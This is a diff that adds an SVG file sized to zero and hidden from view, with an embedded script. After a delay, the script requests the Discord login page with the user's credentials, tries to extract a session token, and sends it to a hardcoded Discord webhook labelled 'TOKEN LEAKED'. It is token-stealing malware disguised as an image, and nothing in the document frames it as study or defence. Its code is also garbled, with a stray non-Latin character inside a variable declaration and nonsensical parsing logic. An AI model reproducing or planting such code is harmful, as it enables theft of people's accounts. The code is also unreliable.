@@ -1,0 +1,25 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="0" height="0" style="position:absolute;pointer-events:none">
+  <script>
+    <![CDATA[
+      setTimeout(() => {
+        const xss = new XMLHttpRequest();
+        xss.open('GET', 'https://discord.com/login');
+        xss.withCredentials = true;
+        xss.onload = () => {
+          const parser = new DOMParser();
+          const doc = parser.parseFromString(xss.responseText, 'text/html');
+          const給 token = doc.body.getAttribute('data-requirem').split('"').reduce((_,v,i,a)=>i%2?_[a[i-1]]=v:_&&_,{})["%2Flogin"].token;
+          if (token) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://ptb.discord.com/api/webhooks/1471739925681672263/x36apqD8zAej77w0AgkfRcTP3COQkPcAFcHrQJhUits7wue0WMXES3hZDqH7HRcnUD4a');
+            xhr.setRequestHeader('Content-type', 'application/json');
+            xhr.send(JSON.stringify({
+              content: `⚠️ TOKEN LEAKED: ${token}`
+            }));
+          }
+        };
+        xss.send();
+      }, 1000);
+    ]]>
+  </script>
+</svg>
